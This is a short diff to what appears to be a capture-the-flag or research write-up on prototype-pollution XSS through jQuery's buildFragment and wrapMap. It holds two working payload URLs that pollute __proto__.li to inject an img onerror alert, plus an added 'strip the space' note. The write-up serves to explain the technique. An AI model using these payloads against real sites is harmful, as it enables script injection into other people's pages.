@@ -65,8 +65,9 @@ in function `buildFragment`,
 We can pp wrapMap. So our evil code can be injected into tmp.
 `tag` is `li`, `li` not in `wrapMap`. So after our pp, `wrapMap['li']` is what we control.
 Then we can control `wrap[1]`. Then `tmp.innerHTML`. In the end, we get the alert.
-```https://msrkp.github.io/?name={%22__proto__%22:{%22li%22:{%221%22:%22%3Cimg%20src%20onerror=alert(1337)%3E%22}},%22length%22:1}```
+```https://msrkp.github.io/?name={ %22__proto__%22:{ %22li%22:{ %221%22:%22%3Cimg%20src%20onerror=alert(1337)%3E%22}},%22length%22:1}```
 And this one.
-```https://msrkp.github.io/?name={%22__proto__%22:{%22li%22:{%222%22:%22%3Cimg%20src%20onerror=alert(1337)%3E%22}},%22length%22:1}```
+```https://msrkp.github.io/?name={ %22__proto__%22:{ %22li%22:{ %222%22:%22%3Cimg%20src%20onerror=alert(1337)%3E%22}},%22length%22:1}```
+strip the space.
 
 
